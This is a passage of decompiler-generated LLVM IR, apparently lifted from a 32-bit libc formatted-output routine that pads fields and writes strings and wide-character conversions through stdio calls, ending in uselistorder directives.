  %v9_804eae5 = icmp eq i32 %v1_804eae5, 0
  %v10_804eae5 = icmp slt i32 %v1_804eae5, 0
  store i1 %v10_804eae5, i1* %sf.global-to-local, align 1
  %v3_804eae8 = icmp eq i1 %v10_804eae5, %v8_804eae5
  %v4_804eae8 = icmp eq i1 %v9_804eae5, false
  %v5_804eae8 = and i1 %v4_804eae8, %v3_804eae8
  %v6_804eae8 = zext i1 %v5_804eae8 to i32
  store i32 %v6_804eae8, i32* %eax.global-to-local, align 4
  %v2_804eaeb = add i32 %v2_804eade, 1
  %v3_804eaeb = add i32 %v2_804eaeb, %v6_804eae8
  store i32 %v3_804eaeb, i32* @edx, align 4
  br label %dec_label_pc_804eaef

dec_label_pc_804eaef:                             ; preds = %dec_label_pc_804eadb, %dec_label_pc_804eae3
  %v0_804eaef = load i32, i32* @esp, align 4
  %v1_804eaef = add i32 %v0_804eaef, 24
  %v2_804eaef = inttoptr i32 %v1_804eaef to i32*
  %v3_804eaef = load i32, i32* %v2_804eaef, align 4
  store i32 %v3_804eaef, i32* %eax.global-to-local, align 4
  %v1_804eaf3 = add i32 %v0_804eaef, 8
  %v2_804eaf3 = inttoptr i32 %v1_804eaf3 to i32*
  store i32 0, i32* %v2_804eaf3, align 4
  %v0_804eafb = load i32, i32* %eax.global-to-local, align 4
  %v1_804eafb = load i32, i32* @edx, align 4
  %v2_804eafb = sub i32 %v0_804eafb, %v1_804eafb
  %v7_804eafb = icmp ult i32 %v0_804eafb, %v1_804eafb
  %v12_804eafb = icmp eq i32 %v2_804eafb, 0
  %v13_804eafb = icmp slt i32 %v2_804eafb, 0
  store i1 %v13_804eafb, i1* %sf.global-to-local, align 1
  %v2_804eafd = or i1 %v7_804eafb, %v12_804eafb
  br i1 %v2_804eafd, label %dec_label_pc_804eb05, label %dec_label_pc_804eaff

dec_label_pc_804eaff:                             ; preds = %dec_label_pc_804eaef
  store i1 %v13_804eafb, i1* %sf.global-to-local, align 1
  store i32 %v2_804eafb, i32* %eax.global-to-local, align 4
  %v1_804eb01 = load i32, i32* @esp, align 4
  %v2_804eb01 = add i32 %v1_804eb01, 8
  %v3_804eb01 = inttoptr i32 %v2_804eb01 to i32*
  store i32 %v2_804eafb, i32* %v3_804eb01, align 4
  %v0_804eb09.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804eb05

dec_label_pc_804eb05:                             ; preds = %dec_label_pc_804eaef, %dec_label_pc_804eaff
  %v0_804eb09 = phi i32 [ %v1_804eafb, %dec_label_pc_804eaef ], [ %v0_804eb09.pre, %dec_label_pc_804eaff ]
  %v0_804eb05 = load i32, i32* @esp, align 4
  %v1_804eb05 = add i32 %v0_804eb05, 8
  %v2_804eb05 = inttoptr i32 %v1_804eb05 to i32*
  %v3_804eb05 = load i32, i32* %v2_804eb05, align 4
  store i32 %v3_804eb05, i32* @ecx, align 4
  %v2_804eb09 = add i32 %v3_804eb05, %v0_804eb09
  store i32 %v2_804eb09, i32* %eax.global-to-local, align 4
  %v1_804eb0c = inttoptr i32 %v0_804eb05 to i32*
  %v2_804eb0c = load i32, i32* %v1_804eb0c, align 4
  %v4_804eb0c = add i32 %v2_804eb0c, %v2_804eb09
  %v15_804eb0c = icmp slt i32 %v4_804eb0c, 0
  store i1 %v15_804eb0c, i1* %sf.global-to-local, align 1
  store i32 %v4_804eb0c, i32* %v1_804eb0c, align 4
  %v0_804eb0f = load i32, i32* @esp, align 4
  %v1_804eb0f = add i32 %v0_804eb0f, 7
  %v2_804eb0f = inttoptr i32 %v1_804eb0f to i8*
  %v3_804eb0f = load i8, i8* %v2_804eb0f, align 1
  %v4_804eb0f = add i8 %v3_804eb0f, -48
  %v9_804eb0f = icmp eq i8 %v4_804eb0f, 0
  %v10_804eb0f = icmp slt i8 %v4_804eb0f, 0
  store i1 %v10_804eb0f, i1* %sf.global-to-local, align 1
  %v1_804eb14 = icmp eq i1 %v9_804eb0f, false
  br i1 %v1_804eb14, label %dec_label_pc_804eb20, label %dec_label_pc_804eb16

dec_label_pc_804eb16:                             ; preds = %dec_label_pc_804eb05
  %v0_804eb16 = load i32, i32* @ebx, align 4
  %v1_804eb16 = load i32, i32* @ecx, align 4
  %v2_804eb16 = add i32 %v1_804eb16, %v0_804eb16
  %v13_804eb16 = icmp slt i32 %v2_804eb16, 0
  store i1 %v13_804eb16, i1* %sf.global-to-local, align 1
  store i32 %v2_804eb16, i32* @ebx, align 4
  %v1_804eb18 = add i32 %v0_804eb0f, 8
  %v2_804eb18 = inttoptr i32 %v1_804eb18 to i32*
  store i32 0, i32* %v2_804eb18, align 4
  %v0_804eb20.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eb20

dec_label_pc_804eb20:                             ; preds = %dec_label_pc_804eb05, %dec_label_pc_804eb16
  %v0_804eb27 = phi i32 [ %v0_804eb0f, %dec_label_pc_804eb05 ], [ %v0_804eb20.pre, %dec_label_pc_804eb16 ]
  %v1_804eb20 = add i32 %v0_804eb27, 32
  %v2_804eb20 = inttoptr i32 %v1_804eb20 to i8*
  %v3_804eb20 = load i8, i8* %v2_804eb20, align 1
  %v4_804eb20 = and i8 %v3_804eb20, 8
  %v5_804eb20 = icmp eq i8 %v4_804eb20, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804eb25 = icmp eq i1 %v5_804eb20, false
  br i1 %v1_804eb25, label %dec_label_pc_804eb4e, label %dec_label_pc_804eb27

dec_label_pc_804eb27:                             ; preds = %dec_label_pc_804eb20
  %v1_804eb27 = add i32 %v0_804eb27, 8
  %v2_804eb27 = inttoptr i32 %v1_804eb27 to i32*
  %v3_804eb27 = load i32, i32* %v2_804eb27, align 4
  store i32 %v3_804eb27, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804eb30 = add i32 %v0_804eb27, 368
  %v2_804eb30 = inttoptr i32 %v1_804eb30 to i32*
  %v3_804eb30 = load i32, i32* %v2_804eb30, align 4
  store i32 %v3_804eb30, i32* @eax, align 4
  %v0_804eb37 = call i32 @_charpad()
  store i32 %v0_804eb37, i32* %eax.global-to-local, align 4
  %v1_804eb3c = load i32, i32* @esp, align 4
  %v2_804eb3c = add i32 %v1_804eb3c, 8
  %v3_804eb3c = inttoptr i32 %v2_804eb3c to i32*
  %v4_804eb3c = load i32, i32* %v3_804eb3c, align 4
  %v5_804eb3c = sub i32 %v0_804eb37, %v4_804eb3c
  %v15_804eb3c = icmp eq i32 %v5_804eb3c, 0
  %v16_804eb3c = icmp slt i32 %v5_804eb3c, 0
  store i1 %v16_804eb3c, i1* %sf.global-to-local, align 1
  %v1_804eb40 = icmp eq i1 %v15_804eb3c, false
  br i1 %v1_804eb40, label %dec_label_pc_804ec3b, label %dec_label_pc_804eb46

dec_label_pc_804eb46:                             ; preds = %dec_label_pc_804eb27
  store i32 0, i32* %v3_804eb3c, align 4
  %v1_804eb4e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eb4e

dec_label_pc_804eb4e:                             ; preds = %dec_label_pc_804eb20, %dec_label_pc_804eb46
  %v1_804eb4e = phi i32 [ %v0_804eb27, %dec_label_pc_804eb20 ], [ %v1_804eb4e.pre, %dec_label_pc_804eb46 ]
  %v0_804eb4e = load i32, i32* %eax.global-to-local, align 4
  %v2_804eb4e = add i32 %v1_804eb4e, -4
  %v3_804eb4e = inttoptr i32 %v2_804eb4e to i32*
  store i32 %v0_804eb4e, i32* %v3_804eb4e, align 4
  %v0_804eb4f = load i32, i32* %eax.global-to-local, align 4
  %v2_804eb4f = add i32 %v1_804eb4e, -8
  %v3_804eb4f = inttoptr i32 %v2_804eb4f to i32*
  store i32 %v0_804eb4f, i32* %v3_804eb4f, align 4
  %v1_804eb50 = add i32 %v1_804eb4e, 368
  %v2_804eb50 = inttoptr i32 %v1_804eb50 to i32*
  %v3_804eb50 = load i32, i32* %v2_804eb50, align 4
  %v5_804eb50 = add i32 %v1_804eb4e, -12
  %v6_804eb50 = inttoptr i32 %v5_804eb50 to i32*
  store i32 %v3_804eb50, i32* %v6_804eb50, align 4
  %v0_804eb57 = load i32, i32* @ebp, align 4
  %v1_804eb57 = add i32 %v0_804eb57, ptrtoint (i32* @global_var_8056785.157 to i32)
  store i32 %v1_804eb57, i32* %eax.global-to-local, align 4
  %v2_804eb5d = add i32 %v1_804eb4e, -16
  %v3_804eb5d = inttoptr i32 %v2_804eb5d to i32*
  store i32 %v1_804eb57, i32* %v3_804eb5d, align 4
  %v0_804eb5e = load i32, i32* %stack_var_-364, align 4
  %v4_804eb5e = inttoptr i32 %v0_804eb5e to i8*
  %v5_804eb5e = call i32 @__GI_fputs_unlocked(i8* %v4_804eb5e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804eb5e, i32* %eax.global-to-local, align 4
  %v0_804eb63 = load i32, i32* @esp, align 4
  %v1_804eb63 = add i32 %v0_804eb63, 384
  %v2_804eb63 = inttoptr i32 %v1_804eb63 to i32*
  %v3_804eb63 = load i32, i32* %v2_804eb63, align 4
  store i32 %v3_804eb63, i32* @eax, align 4
  %v0_804eb6a = load i32, i32* @ebx, align 4
  store i32 %v0_804eb6a, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804eb71 = call i32 @_charpad()
  store i32 %v0_804eb71, i32* %eax.global-to-local, align 4
  %v0_804eb76 = load i32, i32* @esp, align 4
  %v1_804eb76 = add i32 %v0_804eb76, 16
  %v1_804eb79 = load i32, i32* @ebx, align 4
  %v2_804eb79 = sub i32 %v0_804eb71, %v1_804eb79
  %v12_804eb79 = icmp eq i32 %v2_804eb79, 0
  %v13_804eb79 = icmp slt i32 %v2_804eb79, 0
  store i1 %v13_804eb79, i1* %sf.global-to-local, align 1
  %v1_804eb7b = icmp eq i1 %v12_804eb79, false
  br i1 %v1_804eb7b, label %dec_label_pc_804ec3b, label %dec_label_pc_804eb81

dec_label_pc_804eb81:                             ; preds = %dec_label_pc_804eb4e
  %v1_804eb81 = add i32 %v0_804eb76, 356
  %v2_804eb81 = inttoptr i32 %v1_804eb81 to i32*
  %v3_804eb81 = load i32, i32* %v2_804eb81, align 4
  %v4_804eb81 = icmp eq i32 %v3_804eb81, 0
  %v5_804eb81 = icmp slt i32 %v3_804eb81, 0
  store i1 %v5_804eb81, i1* %sf.global-to-local, align 1
  %v1_804eb89 = icmp eq i1 %v4_804eb81, false
  br i1 %v1_804eb89, label %dec_label_pc_804ebad, label %dec_label_pc_804eb8b

dec_label_pc_804eb8b:                             ; preds = %dec_label_pc_804eb81
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804eb8d = load i32, i32* @esi, align 4
  %v1_804eb8d = icmp eq i32 %v0_804eb8d, 0
  %v2_804eb8d = icmp slt i32 %v0_804eb8d, 0
  store i1 %v2_804eb8d, i1* %sf.global-to-local, align 1
  br i1 %v1_804eb8d, label %dec_label_pc_804eba3, label %dec_label_pc_804eb91

dec_label_pc_804eb91:                             ; preds = %dec_label_pc_804eb8b
  %v2_804eb91 = add i32 %v0_804eb76, 12
  %v3_804eb91 = inttoptr i32 %v2_804eb91 to i32*
  store i32 0, i32* %v3_804eb91, align 4
  %v1_804eb92 = add i32 %v0_804eb76, 384
  %v2_804eb92 = inttoptr i32 %v1_804eb92 to i32*
  %v3_804eb92 = load i32, i32* %v2_804eb92, align 4
  %v5_804eb92 = add i32 %v0_804eb76, 8
  %v6_804eb92 = inttoptr i32 %v5_804eb92 to i32*
  store i32 %v3_804eb92, i32* %v6_804eb92, align 4
  %v0_804eb99 = load i32, i32* @esi, align 4
  %v2_804eb99 = add i32 %v0_804eb76, 4
  %v3_804eb99 = inttoptr i32 %v2_804eb99 to i32*
  store i32 %v0_804eb99, i32* %v3_804eb99, align 4
  %v0_804eb9a = load i32, i32* @edi, align 4
  %v3_804eb9a = inttoptr i32 %v0_804eb76 to i32*
  store i32 %v0_804eb9a, i32* %v3_804eb9a, align 4
  %v0_804eb9b = load i32, i32* %stack_var_-364, align 4
  %v4_804eb9b = call i32 @__stdio_fwrite(i32 %v0_804eb9b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804eb9b, i32* %eax.global-to-local, align 4
  %v0_804eba0 = load i32, i32* @esp, align 4
  %v1_804eba0 = add i32 %v0_804eba0, 16
  %v7_804eba0 = icmp slt i32 %v1_804eba0, 0
  store i1 %v7_804eba0, i1* %sf.global-to-local, align 1
  %v1_804eba3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804eba3

dec_label_pc_804eba3:                             ; preds = %dec_label_pc_804eb8b, %dec_label_pc_804eb91
  %v0_804ec0d47 = phi i32 [ %v1_804eb76, %dec_label_pc_804eb8b ], [ %v1_804eba0, %dec_label_pc_804eb91 ]
  %v1_804eba3 = phi i32 [ 0, %dec_label_pc_804eb8b ], [ %v1_804eba3.pre, %dec_label_pc_804eb91 ]
  %v0_804eba3 = phi i32 [ 0, %dec_label_pc_804eb8b ], [ %v4_804eb9b, %dec_label_pc_804eb91 ]
  %v2_804eba3 = sub i32 %v0_804eba3, %v1_804eba3
  %v12_804eba3 = icmp eq i32 %v2_804eba3, 0
  %v13_804eba3 = icmp slt i32 %v2_804eba3, 0
  store i1 %v13_804eba3, i1* %sf.global-to-local, align 1
  %v1_804eba5 = icmp eq i1 %v12_804eba3, false
  br i1 %v1_804eba5, label %dec_label_pc_804ec3b, label %dec_label_pc_804ec0d

dec_label_pc_804ebad:                             ; preds = %dec_label_pc_804eb81
  %v1_804ebad = add i32 %v0_804eb76, 348
  %v2_804ebad = inttoptr i32 %v1_804ebad to i32*
  store i32 0, i32* %v2_804ebad, align 4
  %v0_804ec099 = load i32, i32* @esi, align 4
  %v1_804ec0910 = icmp eq i32 %v0_804ec099, 0
  %v2_804ec0911 = icmp slt i32 %v0_804ec099, 0
  store i1 %v2_804ec0911, i1* %sf.global-to-local, align 1
  %v1_804ec0b17 = icmp eq i1 %v1_804ec0910, false
  %v0_804ebba.pre = load i32, i32* @esp, align 4
  br i1 %v1_804ec0b17, label %dec_label_pc_804ebba, label %dec_label_pc_804ec0d

dec_label_pc_804ebba:                             ; preds = %dec_label_pc_804ebad, %dec_label_pc_804ec07
  %v0_804ebc1 = phi i32 [ %v2_804ec07, %dec_label_pc_804ec07 ], [ %v0_804ec099, %dec_label_pc_804ebad ]
  %v1_804ebcc = phi i32 [ %v0_804ebba42, %dec_label_pc_804ec07 ], [ %v0_804ebba.pre, %dec_label_pc_804ebad ]
  %v1_804ebba = add i32 %v1_804ebcc, 332
  store i32 %v1_804ebba, i32* %edx.global-to-local, align 4
  %v1_804ebc1 = add i32 %v0_804ebc1, -128
  %v2_804ebc1 = icmp ult i32 %v0_804ebc1, 128
  %v6_804ebc1 = icmp eq i32 %v1_804ebc1, 0
  %v7_804ebc1 = icmp slt i32 %v1_804ebc1, 0
  store i1 %v7_804ebc1, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804ebcc = add i32 %v1_804ebcc, -4
  %v3_804ebcc = inttoptr i32 %v2_804ebcc to i32*
  store i32 %v1_804ebba, i32* %v3_804ebcc, align 4
  %v2_804ebcd = or i1 %v2_804ebc1, %v6_804ebc1
  %v3_804ebcd = load i32, i32* %eax.global-to-local, align 4
  %v4_804ebcd = load i32, i32* @esi, align 4
  %v5_804ebcd = select i1 %v2_804ebcd, i32 %v4_804ebcd, i32 %v3_804ebcd
  %v2_804ebd0 = add i32 %v1_804ebcc, -8
  %v3_804ebd0 = inttoptr i32 %v2_804ebd0 to i32*
  store i32 %v5_804ebcd, i32* %v3_804ebd0, align 4
  %v1_804ebd1 = add i32 %v1_804ebcc, 340
  store i32 %v1_804ebd1, i32* %eax.global-to-local, align 4
  %v2_804ebd8 = add i32 %v1_804ebcc, -12
  %v3_804ebd8 = inttoptr i32 %v2_804ebd8 to i32*
  store i32 %v1_804ebd1, i32* %v3_804ebd8, align 4
  %v1_804ebd9 = add i32 %v1_804ebcc, 204
  store i32 %v1_804ebd9, i32* @edi, align 4
  %v2_804ebe0 = add i32 %v1_804ebcc, -16
  %v3_804ebe0 = inttoptr i32 %v2_804ebe0 to i32*
  store i32 %v1_804ebd9, i32* %v3_804ebe0, align 4
  %v0_804ebe1 = call i32 @__GI_wcsrtombs()
  %v0_804ebe6 = load i32, i32* @esp, align 4
  %v1_804ebe6 = add i32 %v0_804ebe6, 16
  store i32 %v0_804ebe1, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ebed = icmp eq i32 %v0_804ebe1, 0
  %v2_804ebed = icmp slt i32 %v0_804ebe1, 0
  store i1 %v2_804ebed, i1* %sf.global-to-local, align 1
  br i1 %v1_804ebed, label %dec_label_pc_804ec03, label %dec_label_pc_804ebf1

dec_label_pc_804ebf1:                             ; preds = %dec_label_pc_804ebba
  %v0_804ebf1 = load i32, i32* @ebp, align 4
  %v2_804ebf1 = add i32 %v0_804ebe6, 12
  %v3_804ebf1 = inttoptr i32 %v2_804ebf1 to i32*
  store i32 %v0_804ebf1, i32* %v3_804ebf1, align 4
  %v1_804ebf2 = add i32 %v0_804ebe6, 384
  %v2_804ebf2 = inttoptr i32 %v1_804ebf2 to i32*
  %v3_804ebf2 = load i32, i32* %v2_804ebf2, align 4
  %v5_804ebf2 = add i32 %v0_804ebe6, 8
  %v6_804ebf2 = inttoptr i32 %v5_804ebf2 to i32*
  store i32 %v3_804ebf2, i32* %v6_804ebf2, align 4
  %v2_804ebf9 = add i32 %v0_804ebe6, 4
  %v3_804ebf9 = inttoptr i32 %v2_804ebf9 to i32*
  store i32 %v0_804ebe1, i32* %v3_804ebf9, align 4
  %v0_804ebfa = load i32, i32* @edi, align 4
  %v3_804ebfa = inttoptr i32 %v0_804ebe6 to i32*
  store i32 %v0_804ebfa, i32* %v3_804ebfa, align 4
  %v0_804ebfb = load i32, i32* %stack_var_-364, align 4
  %v4_804ebfb = call i32 @__stdio_fwrite(i32 %v0_804ebfb, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ebfb, i32* %eax.global-to-local, align 4
  %v0_804ec00 = load i32, i32* @esp, align 4
  %v1_804ec00 = add i32 %v0_804ec00, 16
  %v7_804ec00 = icmp slt i32 %v1_804ec00, 0
  store i1 %v7_804ec00, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ec03

dec_label_pc_804ec03:                             ; preds = %dec_label_pc_804ebba, %dec_label_pc_804ebf1
  %v1_804ec07 = phi i32 [ 0, %dec_label_pc_804ebba ], [ %v4_804ebfb, %dec_label_pc_804ebf1 ]
  %v0_804ebba42 = phi i32 [ %v1_804ebe6, %dec_label_pc_804ebba ], [ %v1_804ec00, %dec_label_pc_804ebf1 ]
  %v2_804ec03 = sub i32 %v1_804ec07, %v0_804ebe1
  %v12_804ec03 = icmp eq i32 %v2_804ec03, 0
  %v13_804ec03 = icmp slt i32 %v2_804ec03, 0
  store i1 %v13_804ec03, i1* %sf.global-to-local, align 1
  %v1_804ec05 = icmp eq i1 %v12_804ec03, false
  br i1 %v1_804ec05, label %dec_label_pc_804ec3b, label %dec_label_pc_804ec07

dec_label_pc_804ec07:                             ; preds = %dec_label_pc_804ec03
  %v0_804ec07 = load i32, i32* @esi, align 4
  %v2_804ec07 = sub i32 %v0_804ec07, %v1_804ec07
  %v12_804ec07 = icmp eq i32 %v2_804ec07, 0
  %v13_804ec07 = icmp slt i32 %v2_804ec07, 0
  store i32 %v2_804ec07, i32* @esi, align 4
  store i1 %v13_804ec07, i1* %sf.global-to-local, align 1
  %v1_804ec0b = icmp eq i1 %v12_804ec07, false
  br i1 %v1_804ec0b, label %dec_label_pc_804ebba, label %dec_label_pc_804ec0d

dec_label_pc_804ec0d:                             ; preds = %dec_label_pc_804ec07, %dec_label_pc_804ebad, %dec_label_pc_804eba3
  %v0_804ec0d = phi i32 [ %v0_804ec0d47, %dec_label_pc_804eba3 ], [ %v0_804ebba.pre, %dec_label_pc_804ebad ], [ %v0_804ebba42, %dec_label_pc_804ec07 ]
  %v1_804ec0d = add i32 %v0_804ec0d, 8
  %v2_804ec0d = inttoptr i32 %v1_804ec0d to i32*
  %v3_804ec0d = load i32, i32* %v2_804ec0d, align 4
  store i32 %v3_804ec0d, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804ec16 = add i32 %v0_804ec0d, 368
  %v2_804ec16 = inttoptr i32 %v1_804ec16 to i32*
  %v3_804ec16 = load i32, i32* %v2_804ec16, align 4
  store i32 %v3_804ec16, i32* @eax, align 4
  %v0_804ec1d = call i32 @_charpad()
  store i32 %v0_804ec1d, i32* %eax.global-to-local, align 4
  %v1_804ec22 = load i32, i32* @esp, align 4
  %v2_804ec22 = add i32 %v1_804ec22, 8
  %v3_804ec22 = inttoptr i32 %v2_804ec22 to i32*
  %v4_804ec22 = load i32, i32* %v3_804ec22, align 4
  %v5_804ec22 = sub i32 %v0_804ec1d, %v4_804ec22
  %v15_804ec22 = icmp eq i32 %v5_804ec22, 0
  %v16_804ec22 = icmp slt i32 %v5_804ec22, 0
  store i1 %v16_804ec22, i1* %sf.global-to-local, align 1
  %v1_804ec26 = icmp eq i1 %v15_804ec22, false
  br i1 %v1_804ec26, label %dec_label_pc_804ec3b, label %dec_label_pc_804ec28

dec_label_pc_804ec28:                             ; preds = %dec_label_pc_804ec0d, %dec_label_pc_804e995, %dec_label_pc_804e7c0
  %v0_804ec28 = phi i32 [ %v1_804ec22, %dec_label_pc_804ec0d ], [ %v0_804ec28.pre, %dec_label_pc_804e995 ], [ %v1_804e7de, %dec_label_pc_804e7c0 ]
  %v1_804ec28 = add i32 %v0_804ec28, 16
  %v2_804ec28 = inttoptr i32 %v1_804ec28 to i32*
  %v3_804ec28 = load i32, i32* %v2_804ec28, align 4
  store i32 %v3_804ec28, i32* @ebx, align 4
  store i32 %v3_804ec28, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e718.backedge

dec_label_pc_804ec33:                             ; preds = %dec_label_pc_804e756
  %v1_804ec33 = add i32 %v0_804ec33, 2
  %v10_804ec33 = icmp slt i32 %v1_804ec33, 0
  store i1 %v10_804ec33, i1* %sf.global-to-local, align 1
  store i32 %v1_804ec33, i32* @ebx, align 4
  br label %dec_label_pc_804e718.backedge

dec_label_pc_804ec3b:                             ; preds = %dec_label_pc_804e742, %dec_label_pc_804ec0d, %dec_label_pc_804eba3, %dec_label_pc_804eb4e, %dec_label_pc_804eb27, %dec_label_pc_804ea97, %dec_label_pc_804ea0a, %dec_label_pc_804e9cb, %dec_label_pc_804e96c, %dec_label_pc_804ec03
  %v0_804ec3b = phi i32 [ %v0_804ebba42, %dec_label_pc_804ec03 ], [ %v0_804ec3b.pre.pre, %dec_label_pc_804e742 ], [ %v1_804ec22, %dec_label_pc_804ec0d ], [ %v0_804ec0d47, %dec_label_pc_804eba3 ], [ %v1_804eb76, %dec_label_pc_804eb4e ], [ %v1_804eb3c, %dec_label_pc_804eb27 ], [ %v0_804e7b8.lcssa, %dec_label_pc_804ea97 ], [ %v1_804ea22, %dec_label_pc_804ea0a ], [ %v1_804e9ee, %dec_label_pc_804e9cb ], [ %v1_804e98a, %dec_label_pc_804e96c ]
  %v1_804ec3b = inttoptr i32 %v0_804ec3b to i32*
  store i32 -1, i32* %v1_804ec3b, align 4
  br label %dec_label_pc_804ec42

dec_label_pc_804ec42:                             ; preds = %dec_label_pc_804e74d, %dec_label_pc_804e6bb, %dec_label_pc_804e6da, %dec_label_pc_804ec3b
  %v0_804ec42 = load i32, i32* @esp, align 4
  %v1_804ec42 = inttoptr i32 %v0_804ec42 to i32*
  %v2_804ec42 = load i32, i32* %v1_804ec42, align 4
  store i32 %v2_804ec42, i32* %eax.global-to-local, align 4
  %v1_804ec45 = add i32 %v0_804ec42, 348
  %v10_804ec45 = icmp slt i32 %v1_804ec45, 0
  store i1 %v10_804ec45, i1* %sf.global-to-local, align 1
  ret i32 %v2_804ec42

; uselistorder directives
  uselistorder i32 %v1_804ec33, { 1, 2, 0 }
  uselistorder i32 %v3_804ec28, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804ec0d, { 1, 0 }
  uselistorder i32 %v2_804ec07, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804ebe6, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804ebe1, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_804ebc1, { 1, 0 }
  uselistorder i32 %v0_804ebba.pre, { 1, 0 }
  uselistorder i32 %v0_804eb8d, { 1, 0 }
  uselistorder i32 %v3_804eb81, { 1, 0 }
  uselistorder i32 %v0_804eb76, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804eb4e, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804eb27, { 0, 2, 1, 3 }
  uselistorder i8 %v4_804eb0f, { 1, 0 }
  uselistorder i32 %v2_804eafb, { 1, 0, 2, 3 }
  uselistorder i32 %v6_804eae8, { 1, 0 }
  uselistorder i32 %v1_804eae5, { 1, 0 }
  uselistorder i32 %v1_804eadb, { 1, 0 }
  uselistorder i32 %v0_804eadb, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804eaba, { 1, 0 }
  uselistorder i32 %v1_804ea97, { 1, 0 }
  uselistorder i32 %v1_804ea55, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804ea71, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804ea3a, { 1, 0 }
  uselistorder i32 %v1_804ea25, { 1, 0 }
  uselistorder i32 %v1_804e9f1, { 1, 0 }
  uselistorder i32 %v0_804e9cb, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_804e9b1, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_804e99d, { 1, 0 }
  uselistorder i32 %v1_804e953, { 1, 0 }
  uselistorder i32 %v4_804e921, { 1, 0 }
  uselistorder i32 %v0_804e916, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804e911, { 1, 0 }
  uselistorder i32 %v0_804e94a, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804e901, { 1, 0 }
  uselistorder i32 %v1_804e8f8, { 1, 0 }
  uselistorder i32 %v1_804e8ec, { 1, 0 }
  uselistorder i32 %v3_804e8e0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804e8d6, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804e8d1, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804e8cf, { 1, 0 }
  uselistorder i32 %v0_804e921, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804e911, { 1, 2, 0 }
  uselistorder i32 %v3_804e8a9, { 0, 1, 3, 2 }
  uselistorder i8 %v4_804e897, { 1, 0 }
  uselistorder i32 %v4_804e88e, { 1, 0 }
  uselistorder i32 %v3_804e88e, { 1, 0 }
  uselistorder i32 %v6_804e886, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_804e857, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_804e856, { 2, 1, 0 }
  uselistorder i32 %v1_804e82f, { 1, 0 }
  uselistorder i32 %v1_804e823, { 1, 0 }
  uselistorder i32 %v1_804e81e, { 1, 0 }
  uselistorder i32 %v2_804e816, { 1, 0 }
  uselistorder i32 %tmp69, { 1, 0 }
  uselistorder i32 %v3_804e800, { 1, 0, 2 }
  uselistorder i8 %v3_804e7ef, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804e7e6, { 1, 0 }
  uselistorder i32 %v3_804e7b8, { 6, 4, 5, 12, 13, 14, 15, 11, 10, 8, 7, 16, 2, 3, 9, 0, 1, 17, 18, 19 }
  uselistorder i32 %v0_804e7b8.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804e7b4, { 1, 0 }
  uselistorder i32 %v1_804e7b4.pre, { 1, 0 }
  uselistorder i32 %v1_804e7b3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804e7b0, { 1, 0 }
  uselistorder i32 %v2_804e7b473, { 1, 0 }
  uselistorder i32 %v3_804e79a, { 1, 0 }
  uselistorder i8 %v4_804e756, { 1, 0 }
  uselistorder i32 %v1_804e756, { 1, 0, 3, 2 }
  uselistorder i8 %v2_804e74d, { 1, 0 }
  uselistorder i32 %v2_804e722, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_804e71e, { 1, 0 }
  uselistorder i8 %v2_804e718, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e726, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e708, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 3, 4, 7, 0, 6, 5, 1, 8, 9, 10, 11 }
